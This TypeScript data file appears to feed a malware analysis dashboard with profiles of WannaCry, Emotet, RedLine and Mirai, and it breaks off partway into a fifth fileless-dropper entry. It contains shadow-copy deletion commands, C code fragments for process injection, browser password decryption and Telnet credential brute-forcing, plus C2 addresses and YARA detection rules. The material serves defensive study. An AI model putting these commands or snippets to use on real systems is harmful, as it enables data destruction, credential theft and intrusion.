import { MalwareSample } from '../types';

export const MALWARE_SAMPLES: MalwareSample[] = [
  {
    id: 'wannacry-ransomware',
    name: 'WannaCry (WanaCrypt0r 2.0)',
    fileName: 'tasksche.exe / mssecsvc.exe',
    fileSizeFormatted: '3.51 MB',
    category: 'RANSOMWARE',
    threatVerdict: 'RANSOMWARE: Malicious Encryptor & Worm',
    threatScore: 98,
    cvssScore: 9.8,
    severity: 'CRITICAL',
    description: 'High-impact cryptoworm utilizing EternalBlue (MS17-010) exploit to propagate through port 445 SMB and encrypt user files using RSA-2048 + AES-128 keys.',
    hashes: {
      md5: '84c82835a5d21bbcf75a61706d8ab549',
      sha1: '5ff465acf83e74a7a166e82900c32c566416d55b',
      sha256: 'ed01ebf83334a19374d4a775bc410110b6287e0d2e549389fb49f70f643f4b78',
      ssdeep: '98304:r7aKqX7V8c+g7U3+qLwO678vGzX:r7aKqXVgc+g7U3+8wO'
    },
    overallEntropy: 7.78,
    entropyBlocks: [4.2, 5.1, 7.85, 7.92, 7.88, 7.94, 7.91, 7.82, 7.76, 7.89, 7.93, 7.84, 7.95, 7.82, 7.74, 5.2, 4.1],
    peHeaders: {
      machine: 'Intel 386 / x86 (0x14c)',
      numberOfSections: 5,
      timeDateStamp: '2010-11-20 09:03:05 (Forged/Timestomped)',
      subsystem: 'Windows GUI (0x2)',
      entryPoint: '0x00401A20',
      imageSize: '0x003A0000 (3.62 MB)'
    },
    sections: [
      { name: '.text', virtualSize: 32768, rawSize: 32768, entropy: 6.42, characteristics: ['CODE', 'EXECUTE', 'READ'], isSuspicious: false },
      { name: '.rdata', virtualSize: 16384, rawSize: 16384, entropy: 5.12, characteristics: ['INITIALIZED_DATA', 'READ'], isSuspicious: false },
      { name: '.data', virtualSize: 8192, rawSize: 8192, entropy: 4.31, characteristics: ['INITIALIZED_DATA', 'READ', 'WRITE'], isSuspicious: false },
      { name: '.rsrc', virtualSize: 3512320, rawSize: 3512320, entropy: 7.98, characteristics: ['INITIALIZED_DATA', 'READ'], isSuspicious: true },
      { name: 'XIAO', virtualSize: 4096, rawSize: 4096, entropy: 7.64, characteristics: ['CODE', 'EXECUTE', 'READ', 'WRITE'], isSuspicious: true }
    ],
    imports: [
      { dll: 'advapi32.dll', functionName: 'CryptEncrypt', category: 'CRYPTO', riskDescription: 'Encrypts buffers in memory using loaded public crypto keys.' },
      { dll: 'advapi32.dll', functionName: 'CryptAcquireContextA', category: 'CRYPTO', riskDescription: 'Initializes cryptographic service provider (PROV_RSA_AES).' },
      { dll: 'advapi32.dll', functionName: 'CreateServiceA', category: 'PERSISTENCE', riskDescription: 'Installs persistent system service mssecsvc2.0.' },
      { dll: 'kernel32.dll', functionName: 'VirtualAlloc', category: 'INJECTION', riskDescription: 'Allocates executable memory with PAGE_EXECUTE_READWRITE.' },
      { dll: 'kernel32.dll', functionName: 'CreateProcessA', category: 'SYSTEM', riskDescription: 'Executes hidden command line processes like vssadmin.exe.' },
      { dll: 'wininet.dll', functionName: 'InternetOpenUrlA', category: 'NETWORK', riskDescription: 'Queries the famous killswitch URL (ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com).' }
    ],
    extractedStrings: [
      { value: 'http://www.ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com', type: 'URL', suspicionScore: 9 },
      { value: 'vssadmin.exe Delete Shadows /All /Quiet', type: 'COMMAND', suspicionScore: 10 },
      { value: 'wbadmin DELETE SYSTEMSTATEBACKUP', type: 'COMMAND', suspicionScore: 9 },
      { value: 'bcdedit /set {default} recoveryenabled No', type: 'COMMAND', suspicionScore: 10 },
      { value: 'WanaCrypt0r', type: 'MUTEX', suspicionScore: 10 },
      { value: '115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn', type: 'BASE64', suspicionScore: 8 },
      { value: '@WanaDecryptor@.exe', type: 'FILE_PATH', suspicionScore: 9 }
    ],
    dynamicEvents: [
      { step: 1, timestamp: '+0.012s', type: 'NETWORK_DNS', description: 'DNS query for killswitch domain: ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com', target: 'Port 53 (DNS)', severity: 'MEDIUM' },
      { step: 2, timestamp: '+0.045s', type: 'REGISTRY_WRITE', description: 'Created service mssecsvc2.0 with start type AUTO_START', target: 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\mssecsvc2.0', severity: 'HIGH' },
      { step: 3, timestamp: '+0.098s', type: 'MEMORY_INJECT', description: 'Unpacked encrypted payload ZIP archive from .rsrc into memory', target: 'VirtualAlloc (RWX 0x005E0000)', severity: 'CRITICAL' },
      { step: 4, timestamp: '+0.150s', type: 'PROCESS_SPAWN', description: 'Spawned hidden process cmd.exe to destroy system recovery points', target: 'vssadmin.exe Delete Shadows /All /Quiet', severity: 'CRITICAL' },
      { step: 5, timestamp: '+0.230s', type: 'CRYPTO_OP', description: 'Recursively generating AES keys and encrypting user files (.docx, .pdf, .jpg, .sql)', target: 'C:\\Users\\Victim\\Documents\\*', severity: 'CRITICAL' },
      { step: 6, timestamp: '+0.340s', type: 'FILE_WRITE', description: 'Dropped ransom note @Please_Read_Me@.txt and @WanaDecryptor@.exe', target: 'Desktop\\@WanaDecryptor@.exe', severity: 'HIGH' }
    ],
    processTree: {
      id: 'p1',
      name: 'mssecsvc.exe',
      pid: 2480,
      commandLine: 'C:\\Windows\\mssecsvc.exe -m security',
      status: 'MALICIOUS',
      children: [
        {
          id: 'p2',
          name: 'tasksche.exe',
          pid: 3104,
          ppid: 2480,
          commandLine: 'C:\\ProgramData\\tasksche.exe /install',
          status: 'MALICIOUS',
          children: [
            {
              id: 'p3',
              name: 'cmd.exe',
              pid: 4892,
              ppid: 3104,
              commandLine: 'cmd.exe /c "vssadmin.exe Delete Shadows /All /Quiet"',
              status: 'MALICIOUS',
              children: [
                {
                  id: 'p4',
                  name: 'vssadmin.exe',
                  pid: 5120,
                  ppid: 4892,
                  commandLine: 'vssadmin.exe Delete Shadows /All /Quiet',
                  status: 'TERMINATED'
                }
              ]
            },
            {
              id: 'p5',
              name: '@WanaDecryptor@.exe',
              pid: 6184,
              ppid: 3104,
              commandLine: '"C:\\Users\\Victim\\Desktop\\@WanaDecryptor@.exe"',
              status: 'RUNNING'
            }
          ]
        }
      ]
    },
    yaraRules: [
      {
        id: 'yara-wannacry-1',
        name: 'RANSOMWARE_WannaCry_Indicators',
        meta: {
          author: 'ThreatResearch / AMDS',
          description: 'Detects WannaCrypt0r 2.0 binaries based on killswitch URL and shadow copy destruction commands',
          threatFamily: 'WannaCry',
          confidence: 'High'
        },
        strings: [
          { id: '$s1', pattern: 'http://www.ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com' },
          { id: '$s2', pattern: 'vssadmin.exe Delete Shadows /All /Quiet' },
          { id: '$s3', pattern: 'WanaCrypt0r' },
          { id: '$h1', pattern: '84 C8 28 35 A5 D2 1B BC', isHex: true }
        ],
        condition: '($s1 or $s2) and ($s3 or $h1)',
        matched: true,
        matchedStrings: ['$s1', '$s2', '$s3', '$h1']
      },
      {
        id: 'yara-ransom-generic',
        name: 'GENERIC_Ransomware_ShadowCopy_Eraser',
        meta: {
          author: 'AMDS Rule Engine',
          description: 'Flags binaries attempting to execute shadow copy destruction via vssadmin or wbadmin',
          threatFamily: 'Generic Ransomware',
          confidence: 'Medium-High'
        },
        strings: [
          { id: '$vss', pattern: 'vssadmin' },
          { id: '$del', pattern: 'Delete Shadows' },
          { id: '$bcd', pattern: 'recoveryenabled No' }
        ],
        condition: '$vss and ($del or $bcd)',
        matched: true,
        matchedStrings: ['$vss', '$del', '$bcd']
      }
    ],
    mitreTechniques: [
      { id: 'T1486', tactic: 'Impact', name: 'Data Encrypted for Impact', description: 'Encrypts data on target systems to interrupt availability.', observedInSample: true },
      { id: 'T1490', tactic: 'Impact', name: 'Inhibit System Recovery', description: 'Deletes Volume Shadow Copies (vssadmin) to prevent backup restore.', observedInSample: true },
      { id: 'T1210', tactic: 'Lateral Movement', name: 'Exploitation of Remote Services', description: 'Exploits SMBv1 vulnerability (EternalBlue / MS17-010) across ports 445/139.', observedInSample: true },
      { id: 'T1543.003', tactic: 'Persistence', name: 'Create Windows Service', description: 'Installs mssecsvc2.0 system service.', observedInSample: true },
      { id: 'T1071.001', tactic: 'Command and Control', name: 'Web Protocols', description: 'Checks killswitch URL via HTTP request.', observedInSample: true }
    ],
    payloadSnippet: `// Disassembled Entry Point & Killswitch Routine
void __cdecl main() {
    HINTERNET hInternet = InternetOpenA("Microsoft Internet Explorer", 0, NULL, NULL, 0);
    HINTERNET hUrl = InternetOpenUrlA(hInternet, 
        "http://www.ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com", NULL, 0, 0x80000000, 0);
    
    // Killswitch check: if domain exists, terminate!
    if (hUrl != NULL) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        ExitProcess(0); // Exit benignly
    }
    
    // Begin Encryption & Destruction
    WinExec("cmd.exe /c vssadmin.exe Delete Shadows /All /Quiet", SW_HIDE);
    WinExec("cmd.exe /c bcdedit /set {default} recoveryenabled No", SW_HIDE);
    ExtractResourceAndSpawn("XIAO", "tasksche.exe");
    ExecuteAESWorkerPool();
}`,
    analysisExplanation: {
      whatItDoes: 'WannaCry scans internal and external subnets for vulnerable SMB ports (445), injects itself remotely, deletes all Windows volume shadow backups, and encrypts document/database files with AES, demanding Bitcoin for the decryption key.',
      howDetected: 'Caught by static analysis of cryptographic API calls (CryptEncrypt) coupled with extreme .rsrc section entropy (7.98), hardcoded command strings ("vssadmin Delete Shadows"), and anomalous outbound port 445 scanning.',
      whyDangerous: 'It self-propagates automatically without user interaction (worm capability) and permanently destroys system restore points before encrypting mission-critical data.'
    }
  },
  {
    id: 'emotet-trojan-loader',
    name: 'Emotet Banking Trojan & Loader',
    fileName: 'invoice_march_doc.vbs / payload.dll',
    fileSizeFormatted: '482 KB',
    category: 'TROJAN',
    threatVerdict: 'TROJAN: Modular Botnet & Credential Harvester',
    threatScore: 94,
    cvssScore: 9.1,
    severity: 'CRITICAL',
    description: 'Polymorphic modular trojan acting as a malware-as-a-service (MaaS) dropper. Steals email credentials, drops secondary payloads like TrickBot and Cobalt Strike beacons.',
    hashes: {
      md5: '7b9b3e150a04944d70081d683709b1f7',
      sha1: '32ea6ef0549c4f0db5c1c4f69910d510b64d0752',
      sha256: '9f2a967a57a16f6b158097f482098b0f4439c288923a1a364843b0069cb98a72',
      ssdeep: '6144:oR8sK21B+N34/KkX91a:oR8sK21B+NQkXa'
    },
    overallEntropy: 7.45,
    entropyBlocks: [5.2, 6.1, 6.8, 7.6, 7.8, 7.9, 7.85, 7.7, 7.6, 7.8, 7.9, 7.85, 7.2, 6.0],
    peHeaders: {
      machine: 'Intel 386 / x86 (0x14c)',
      numberOfSections: 4,
      timeDateStamp: '2023-04-12 14:22:18',
      subsystem: 'Windows DLL (0x2)',
      entryPoint: '0x100024B0',
      imageSize: '0x00085000 (532 KB)'
    },
    sections: [
      { name: '.text', virtualSize: 98304, rawSize: 98304, entropy: 6.82, characteristics: ['CODE', 'EXECUTE', 'READ'], isSuspicious: false },
      { name: '.data', virtualSize: 131072, rawSize: 131072, entropy: 7.82, characteristics: ['INITIALIZED_DATA', 'READ', 'WRITE'], isSuspicious: true },
      { name: '.rsrc', virtualSize: 16384, rawSize: 16384, entropy: 5.61, characteristics: ['INITIALIZED_DATA', 'READ'], isSuspicious: false },
      { name: '.reloc', virtualSize: 8192, rawSize: 8192, entropy: 4.12, characteristics: ['READ'], isSuspicious: false }
    ],
    imports: [
      { dll: 'kernel32.dll', functionName: 'VirtualAllocEx', category: 'INJECTION', riskDescription: 'Allocates memory inside remote target process (svchost.exe).' },
      { dll: 'kernel32.dll', functionName: 'WriteProcessMemory', category: 'INJECTION', riskDescription: 'Writes malicious shellcode directly into target process address space.' },
      { dll: 'kernel32.dll', functionName: 'CreateRemoteThread', category: 'INJECTION', riskDescription: 'Executes injected payload inside legitimate host process (Process Injection).' },
      { dll: 'wininet.dll', functionName: 'HttpSendRequestA', category: 'NETWORK', riskDescription: 'Transmits encrypted JSON/Protobuf C2 heartbeats.' },
      { dll: 'advapi32.dll', functionName: 'RegSetValueExA', category: 'PERSISTENCE', riskDescription: 'Sets autostart key in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.' }
    ],
    extractedStrings: [
      { value: 'powershell.exe -enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA...', type: 'BASE64', suspicionScore: 9 },
      { value: '185.244.150.84:8080', type: 'IP_ADDRESS', suspicionScore: 9 },
      { value: '91.240.118.168:443', type: 'IP_ADDRESS', suspicionScore: 9 },
      { value: 'Software\\Microsoft\\Windows\\CurrentVersion\\Run\\EmotetLoader', type: 'REGISTRY', suspicionScore: 8 },
      { value: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', type: 'URL', suspicionScore: 3 }
    ],
    dynamicEvents: [
      { step: 1, timestamp: '+0.020s', type: 'PROCESS_SPAWN', description: 'WScript.exe spawned obfuscated PowerShell with -NoProfile -ExecutionPolicy Bypass', target: 'powershell.exe', severity: 'HIGH' },
      { step: 2, timestamp: '+0.080s', type: 'NETWORK_TCP', description: 'Outbound HTTP beaconing with base64 victim telemetry sent to C2 node', target: '185.244.150.84:8080/api/v2', severity: 'CRITICAL' },
      { step: 3, timestamp: '+0.140s', type: 'FILE_WRITE', description: 'Payload DLL downloaded and written into hidden %LOCALAPPDATA% directory', target: 'C:\\Users\\Victim\\AppData\\Local\\Temp\\dxgl.dll', severity: 'HIGH' },
      { step: 4, timestamp: '+0.210s', type: 'MEMORY_INJECT', description: 'Injected unhooked shellcode into svchost.exe via CreateRemoteThread', target: 'svchost.exe (PID 1120)', severity: 'CRITICAL' },
      { step: 5, timestamp: '+0.290s', type: 'REGISTRY_WRITE', description: 'Created autostart persistence key in HKCU\\...\\Run', target: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', severity: 'HIGH' }
    ],
    processTree: {
      id: 'p1',
      name: 'wscript.exe',
      pid: 1844,
      commandLine: 'wscript.exe "C:\\Users\\Victim\\Downloads\\invoice_doc.vbs"',
      status: 'MALICIOUS',
      children: [
        {
          id: 'p2',
          name: 'powershell.exe',
          pid: 2956,
          ppid: 1844,
          commandLine: 'powershell.exe -w hidden -enc JABjAGwAaQBl...',
          status: 'MALICIOUS',
          children: [
            {
              id: 'p3',
              name: 'svchost.exe',
              pid: 1120,
              ppid: 2956,
              commandLine: 'C:\\Windows\\system32\\svchost.exe -k netsvcs',
              status: 'INJECTED'
            }
          ]
        }
      ]
    },
    yaraRules: [
      {
        id: 'yara-emotet-1',
        name: 'TROJAN_Emotet_Epoch_Loader',
        meta: {
          author: 'AMDS ThreatIntel',
          description: 'Identifies Emotet banking trojan payload loaders',
          threatFamily: 'Emotet',
          confidence: 'High'
        },
        strings: [
          { id: '$c2_beacon', pattern: '185.244.150.84' },
          { id: '$run_key', pattern: 'Software\\Microsoft\\Windows\\CurrentVersion\\Run' },
          { id: '$inject', pattern: 'CreateRemoteThread' }
        ],
        condition: '2 of ($c2_beacon, $run_key, $inject)',
        matched: true,
        matchedStrings: ['$c2_beacon', '$run_key', '$inject']
      }
    ],
    mitreTechniques: [
      { id: 'T1059.001', tactic: 'Execution', name: 'PowerShell', description: 'Executes encoded commands to download secondary binaries.', observedInSample: true },
      { id: 'T1055.001', tactic: 'Defense Evasion', name: 'Dynamic-link Library Injection', description: 'Injects malicious DLL into svchost.exe.', observedInSample: true },
      { id: 'T1547.001', tactic: 'Persistence', name: 'Registry Run Keys', description: 'Establishes persistence through User Run keys.', observedInSample: true },
      { id: 'T1071.001', tactic: 'Command and Control', name: 'Web Protocols', description: 'Communicates with multiple distributed C2 servers.', observedInSample: true }
    ],
    payloadSnippet: `// Obfuscated Dropper Extraction & Remote Injection
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pRemoteBuf, rawShellcode, payloadSize, NULL);
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuf, NULL, 0, NULL);
WaitForSingleObject(hThread, 5000);
CloseHandle(hProcess);`,
    analysisExplanation: {
      whatItDoes: 'Emotet arrives as a phishing email with a macro/VBS attachment, initiates living-off-the-land PowerShell commands, connects to C2 infrastructure, and injects secondary modules into svchost.exe to harvest credentials.',
      howDetected: 'Detected via memory injection API imports (VirtualAllocEx + CreateRemoteThread), encoded PowerShell command line execution, and known C2 IP traffic heuristics.',
      whyDangerous: 'Acts as an entry gateway for severe follow-up cybercrime groups, deploying ransomware like Ryuk and Conti across corporate Active Directory domains.'
    }
  },
  {
    id: 'redline-stealer',
    name: 'RedLine / DarkComet Infostealer',
    fileName: 'setup_game_cheat_v2.exe',
    fileSizeFormatted: '1.14 MB',
    category: 'SPYWARE_KEYLOGGER',
    threatVerdict: 'SPYWARE: Credential, Cookie & Crypto Wallet Stealer',
    threatScore: 89,
    cvssScore: 8.7,
    severity: 'HIGH',
    description: 'Steals stored web browser passwords, Discord tokens, Telegram sessions, cryptocurrency wallet dat files, and logs keystrokes using global user32 API hooks.',
    hashes: {
      md5: '419caefb8a91349b1a54ad6f59b9ec22',
      sha1: '81f087a32b6ad5e9ef0c9b68832a820c76dbbf91',
      sha256: '3cbfa40d993175d799011ba2cf3df1df0e80df0a4b3d75079a4be29841f3e791',
      ssdeep: '24576:hK3w+kQ93A1yUe2Z0r8bM5/K7qUe:hK3wkQ93A1yUe2Z0'
    },
    overallEntropy: 6.95,
    entropyBlocks: [4.8, 5.2, 6.1, 7.1, 7.2, 7.3, 7.4, 7.35, 7.2, 7.1, 6.8, 5.9],
    peHeaders: {
      machine: 'Intel 386 / x86 (0x14c)',
      numberOfSections: 3,
      timeDateStamp: '2024-01-18 19:40:02',
      subsystem: 'Windows GUI (0x2)',
      entryPoint: '0x00403100',
      imageSize: '0x00120000 (1.18 MB)'
    },
    sections: [
      { name: '.text', virtualSize: 458752, rawSize: 458752, entropy: 6.91, characteristics: ['CODE', 'EXECUTE', 'READ'], isSuspicious: false },
      { name: '.rdata', virtualSize: 196608, rawSize: 196608, entropy: 6.84, characteristics: ['INITIALIZED_DATA', 'READ'], isSuspicious: false },
      { name: '.data', virtualSize: 65536, rawSize: 65536, entropy: 7.21, characteristics: ['INITIALIZED_DATA', 'READ', 'WRITE'], isSuspicious: true }
    ],
    imports: [
      { dll: 'user32.dll', functionName: 'SetWindowsHookExA', category: 'SPYWARE', riskDescription: 'Installs global keyboard hook (WH_KEYBOARD_LL) to capture all keystrokes.' },
      { dll: 'user32.dll', functionName: 'GetAsyncKeyState', category: 'SPYWARE', riskDescription: 'Polls state of keyboard keys in a background loop.' },
      { dll: 'gdi32.dll', functionName: 'BitBlt', category: 'SPYWARE', riskDescription: 'Captures desktop screenshots and uploads to attacker.' },
      { dll: 'crypt32.dll', functionName: 'CryptUnprotectData', category: 'CRYPTO', riskDescription: 'Decrypts Chrome/Edge/Brave saved passwords and cookies using DPAPI.' },
      { dll: 'kernel32.dll', functionName: 'IsDebuggerPresent', category: 'EVASION', riskDescription: 'Anti-analysis check to evade malware researcher debuggers.' }
    ],
    extractedStrings: [
      { value: '\\Google\\Chrome\\User Data\\Default\\Login Data', type: 'FILE_PATH', suspicionScore: 9 },
      { value: '\\Wallets\\Atomic\\Local Storage\\leveldb', type: 'FILE_PATH', suspicionScore: 8 },
      { value: 'https://api.telegram.org/bot728192841:AAH.../sendDocument', type: 'URL', suspicionScore: 10 },
      { value: '193.106.191.121:12488', type: 'IP_ADDRESS', suspicionScore: 9 },
      { value: 'WH_KEYBOARD_LL', type: 'COMMAND', suspicionScore: 8 }
    ],
    dynamicEvents: [
      { step: 1, timestamp: '+0.010s', type: 'MEMORY_INJECT', description: 'Invoked IsDebuggerPresent() and CheckRemoteDebuggerPresent()', target: 'PEB.BeingDebugged Flag', severity: 'MEDIUM' },
      { step: 2, timestamp: '+0.040s', type: 'FILE_WRITE', description: 'Scanned SQLite Login Data database and dumped master password vault', target: '%APPDATA%\\Local\\Google\\Chrome\\User Data', severity: 'CRITICAL' },
      { step: 3, timestamp: '+0.075s', type: 'CRYPTO_OP', description: 'Called CryptUnprotectData to decrypt Chrome DPAPI AES-256-GCM master key', target: 'Local State DPAPI Key', severity: 'CRITICAL' },
      { step: 4, timestamp: '+0.120s', type: 'REGISTRY_WRITE', description: 'Hooked WH_KEYBOARD_LL for continuous background keylogging', target: 'user32!SetWindowsHookEx', severity: 'HIGH' },
      { step: 5, timestamp: '+0.190s', type: 'NETWORK_TCP', description: 'Exfiltrated compressed ZIP containing passwords, cookies, and tokens via Telegram Bot API', target: 'api.telegram.org:443', severity: 'CRITICAL' }
    ],
    processTree: {
      id: 'p1',
      name: 'setup_game_cheat_v2.exe',
      pid: 4012,
      commandLine: '"C:\\Users\\Victim\\Downloads\\setup_game_cheat_v2.exe"',
      status: 'MALICIOUS',
      children: [
        {
          id: 'p2',
          name: 'conhost.exe',
          pid: 4016,
          ppid: 4012,
          commandLine: '\\??\\C:\\Windows\\system32\\conhost.exe',
          status: 'RUNNING'
        }
      ]
    },
    yaraRules: [
      {
        id: 'yara-redline-1',
        name: 'SPYWARE_RedLine_Stealer_Signatures',
        meta: {
          author: 'AMDS Intelligence',
          description: 'Matches RedLine stealer browser DPAPI decryption routines and Telegram exfil',
          threatFamily: 'RedLine Stealer',
          confidence: 'High'
        },
        strings: [
          { id: '$chrome', pattern: 'Login Data' },
          { id: '$dpapi', pattern: 'CryptUnprotectData' },
          { id: '$tg', pattern: 'api.telegram.org/bot' }
        ],
        condition: 'all of ($chrome, $dpapi, $tg)',
        matched: true,
        matchedStrings: ['$chrome', '$dpapi', '$tg']
      }
    ],
    mitreTechniques: [
      { id: 'T1555.003', tactic: 'Credential Access', name: 'Credentials from Web Browsers', description: 'Extracts stored login credentials and cookie session tokens.', observedInSample: true },
      { id: 'T1056.001', tactic: 'Collection', name: 'Keylogging', description: 'Captures keystrokes using SetWindowsHookEx.', observedInSample: true },
      { id: 'T1005', tactic: 'Collection', name: 'Data from Local System', description: 'Searches for cryptocurrency wallet folders.', observedInSample: true },
      { id: 'T1567.002', tactic: 'Exfiltration', name: 'Exfiltration to Cloud Storage', description: 'Transmits stolen data over HTTPS using Telegram bot API.', observedInSample: true }
    ],
    payloadSnippet: `// DPAPI Browser Password Extraction Hook
DATA_BLOB DataIn, DataOut;
DataIn.pbData = encryptedPasswordBuffer;
DataIn.cbData = encryptedPasswordLength;

if (CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut)) {
    // Decrypted cleartext credential captured!
    char* plaintextPassword = (char*)DataOut.pbData;
    AppendToStolenPayloadLog(targetUrl, targetUsername, plaintextPassword);
    LocalFree(DataOut.pbData);
}`,
    analysisExplanation: {
      whatItDoes: 'Disguised as software cracks or games, RedLine harvests web browser logins, stored credit cards, cryptocurrency private keys, and session tokens, sending them directly to an attacker via Telegram/Discord bots or C2 servers.',
      howDetected: 'Identified by the combination of CryptUnprotectData, browser SQLite file path queries, and anomalous HTTPS uploads to Telegram Bot endpoints.',
      whyDangerous: 'Enables instant account takeover, bypassing multi-factor authentication (MFA) through stolen session cookies.'
    }
  },
  {
    id: 'mirai-botnet',
    name: 'Mirai / Mozi IoT Botnet Worm',
    fileName: 'mirai.arm7 / dvrHelper.bin',
    fileSizeFormatted: '124 KB',
    category: 'WORM_BOTNET',
    threatVerdict: 'BOTNET WORM: Telnet Brute-Forcer & DDoS Agent',
    threatScore: 86,
    cvssScore: 8.5,
    severity: 'HIGH',
    description: 'Embedded Linux ELF binary targeting IoT cameras and routers. Brute forces default Telnet credentials (root/admin/123456) and joins a centralized DDoS botnet.',
    hashes: {
      md5: '71a4f00b9826a7cb8e29a997b693240e',
      sha1: '371893bb07d0da218177dfc89698df2410a80e12',
      sha256: '990bc74a621be55e2ff71f6521a00a4fb7d780775d79904791e843c08dbb0a21',
      ssdeep: '1536:1kPz3+Q9u2+x8r6yV0r8bM5/K7qUe:1kPz3+Q9u2'
    },
    overallEntropy: 6.12,
    entropyBlocks: [4.1, 5.3, 6.2, 6.5, 6.3, 6.1, 5.8, 4.9],
    peHeaders: {
      machine: 'ARM Little Endian (ELF 32-bit)',
      numberOfSections: 4,
      timeDateStamp: '2022-08-10 03:15:00',
      subsystem: 'POSIX / Linux (0x0)',
      entryPoint: '0x000080E0',
      imageSize: '0x00021000 (135 KB)'
    },
    sections: [
      { name: '.text', virtualSize: 65536, rawSize: 65536, entropy: 6.31, characteristics: ['CODE', 'EXECUTE', 'READ'], isSuspicious: false },
      { name: '.rodata', virtualSize: 24576, rawSize: 24576, entropy: 5.92, characteristics: ['READ'], isSuspicious: false },
      { name: '.data', virtualSize: 16384, rawSize: 16384, entropy: 4.81, characteristics: ['READ', 'WRITE'], isSuspicious: false },
      { name: '.bss', virtualSize: 8192, rawSize: 0, entropy: 0.0, characteristics: ['READ', 'WRITE'], isSuspicious: false }
    ],
    imports: [
      { dll: 'libc.so.6', functionName: 'socket', category: 'NETWORK', riskDescription: 'Creates raw socket descriptor for SYN flood attack generation.' },
      { dll: 'libc.so.6', functionName: 'sendto', category: 'NETWORK', riskDescription: 'Sends raw spoofed UDP/TCP DDoS packet bursts.' },
      { dll: 'libc.so.6', functionName: 'fork', category: 'SYSTEM', riskDescription: 'Forks scanning worker daemon processes.' },
      { dll: 'libc.so.6', functionName: 'prctl', category: 'EVASION', riskDescription: 'Changes process name in /proc to masquerade as innocent system process.' }
    ],
    extractedStrings: [
      { value: 'admin / 123456 / root / xc3511 / default', type: 'COMMAND', suspicionScore: 9 },
      { value: '/bin/busybox WGET http://...', type: 'COMMAND', suspicionScore: 9 },
      { value: 'cnc.mirai-bot-network.cc:23', type: 'URL', suspicionScore: 9 },
      { value: 'PONG / ATTACK_SYN_FLOOD', type: 'COMMAND', suspicionScore: 8 }
    ],
    dynamicEvents: [
      { step: 1, timestamp: '+0.005s', type: 'PROCESS_SPAWN', description: 'Forked background daemon process and modified process title to "/bin/systemd"', target: 'Process rename to benign systemd', severity: 'MEDIUM' },
      { step: 2, timestamp: '+0.025s', type: 'NETWORK_TCP', description: 'Connected to Telnet port 23 on randomized IP range 182.0.0.0/8', target: 'Port 23 (Telnet Scan)', severity: 'HIGH' },
      { step: 3, timestamp: '+0.060s', type: 'NETWORK_TCP', description: 'Brute-force credential spray attempt using dictionary list (root:admin, root:vizxv)', target: 'Default credential database spray', severity: 'HIGH' },
      { step: 4, timestamp: '+0.110s', type: 'NETWORK_TCP', description: 'Connected to Command and Control (C2) server and sent bot check-in beacon', target: 'cnc.mirai-bot-network.cc:23', severity: 'CRITICAL' }
    ],
    processTree: {
      id: 'p1',
      name: 'dvrHelper.bin',
      pid: 1045,
      commandLine: './dvrHelper.bin',
      status: 'MALICIOUS',
      children: [
        {
          id: 'p2',
          name: 'scanner_worker',
          pid: 1046,
          ppid: 1045,
          commandLine: '[systemd-timesync] (Spoofed)',
          status: 'MALICIOUS'
        }
      ]
    },
    yaraRules: [
      {
        id: 'yara-mirai-1',
        name: 'WORM_Mirai_Telnet_Scanner',
        meta: {
          author: 'AMDS Rules',
          description: 'Detects Mirai botnet dictionary credentials and attack commands',
          threatFamily: 'Mirai',
          confidence: 'High'
        },
        strings: [
          { id: '$cred1', pattern: 'xc3511' },
          { id: '$cred2', pattern: 'vizxv' },
          { id: '$cmd', pattern: '/bin/busybox' }
        ],
        condition: '2 of them',
        matched: true,
        matchedStrings: ['$cred1', '$cred2', '$cmd']
      }
    ],
    mitreTechniques: [
      { id: 'T1110.001', tactic: 'Credential Access', name: 'Password Guessing', description: 'Brute forces default IoT credentials over Telnet port 23/2323.', observedInSample: true },
      { id: 'T1498', tactic: 'Impact', name: 'Network Denial of Service', description: 'Executes high-volume SYN/UDP/GRE flood DDoS attacks.', observedInSample: true },
      { id: 'T1036.004', tactic: 'Defense Evasion', name: 'Masquerade Task or Service', description: 'Renames process in Linux process table using prctl().', observedInSample: true }
    ],
    payloadSnippet: `// Telnet Scanner & Raw Socket Flooder Loop
void scanner_init() {
    int sfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(23); // Telnet
    dest.sin_addr.s_addr = get_random_ip();
    
    if (connect(sfd, (struct sockaddr *)&dest, sizeof(dest)) == 0) {
        // Send dictionary credentials
        send_telnet_auth(sfd, "root", "xc3511");
        send_telnet_auth(sfd, "admin", "admin");
    }
}`,
    analysisExplanation: {
      whatItDoes: 'Mirai automatically scans the Internet for vulnerable IoT hardware with factory default credentials, infects them, kills competing malware, and weaponizes them into a massive DDoS swarm.',
      howDetected: 'Identified by embedded default password strings (xc3511, vizxv), raw socket system calls, and automated port 23 sweep telemetry.',
      whyDangerous: 'Capable of generating multi-terabit DDoS floods that take down critical internet infrastructure (such as DNS providers like Dyn).'
    }
  },
  {
    id: 'fileless-dropper',
    name: 'Fileless PowerShell / AMSI Bypass Dropper',
    fileName: 'invoice_updater.ps1',
    fileSizeFormatted: '18 KB',
    category: 'FILELESS_DROPPER',
    threatVerdict: 'FILELESS THREAT: Memory-Only Reflective Dropper',
    threatScore: 91,
    cvssScore: 8.9,
    severity: 'CRITICAL',
    description: 'Executes entirely in RAM using living-off-the-land binaries (LOLBins). Patches Antimalware Scan Interface (AmsiScanBuffer) in memory to blind antivirus before loading reflective shellcode.',
    hashes: {
      md5: '9a3f2b1897c8d9e0123456789abcdef0',
